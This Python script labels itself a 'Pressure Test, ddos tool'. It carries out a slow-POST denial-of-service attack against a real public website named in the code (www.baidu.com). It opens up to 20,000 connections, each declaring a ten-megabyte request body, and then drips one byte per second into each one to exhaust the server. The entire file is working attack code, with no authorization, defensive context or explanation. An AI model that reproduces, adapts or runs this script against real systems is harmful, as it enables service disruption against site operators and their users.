#!/usr/bin/env python
import socket
import time
import threading
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=20000
PORT=80
HOST="www.baidu.com"
PAGE="/index.php"
#---------------------------
 
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
 
socks=[]

def conn_thread():
	global socks
	for i in range(0,MAX_CONN):
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:
			s.connect((HOST,PORT))
			s.send(buf)
			print("Send buf OK!,conn=%d\n"%i)
			socks.append(s)
		except Exception:
			print("Could not connect to server or send error:")
			time.sleep(10)
#end def
 
def send_thread():
	global socks
	while True:
		for s in socks:
			try:
				s.send("f")
				#print "send OK!"
			except Exception:
				print("Send Exception:%s\n")
				socks.remove(s)
				s.close()
		time.sleep(1)
#end def
 
conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
 
conn_th.start()
send_th.start()
